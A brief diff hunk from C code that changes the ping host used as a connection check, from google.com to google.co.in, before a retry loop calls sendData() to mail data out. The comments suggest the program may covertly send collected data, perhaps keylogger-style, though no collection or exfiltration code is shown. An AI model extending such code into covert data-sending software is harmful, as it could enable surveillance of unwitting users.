@@ -48,7 +48,7 @@ main(){
         while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping www.google.com -n 1")){ ///check connection
+            if(!system("ping www.google.co.in -n 1")){ ///check connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
